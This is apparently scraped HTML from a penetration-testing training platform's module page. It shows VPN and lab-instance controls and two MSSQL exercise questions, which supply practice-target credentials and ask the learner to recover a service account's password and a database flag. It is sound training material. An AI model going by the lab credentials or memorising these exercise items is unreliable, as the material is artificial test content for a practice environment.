<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="36" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="39" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="41" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="47" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                Authenticate
                                to <span class="target-protocol-ip target-protocol-ip-1170 text-dark"></span> with user "<span class="text-success">htbdbuser</span>" and
                                password "<span class="text-danger">MSSQLAccess01!</span>" </p>
<label class="module-question" for="1170"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> What is the password for the "mssqlsvc" user?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer1170" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-1170">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="1170" id="btnAnswer1170">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<label class="module-question" for="1171"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Enumerate the "flagDB" database and submit a flag as your answer.
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer1171" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-1171">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="1171" id="btnAnswer1171">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
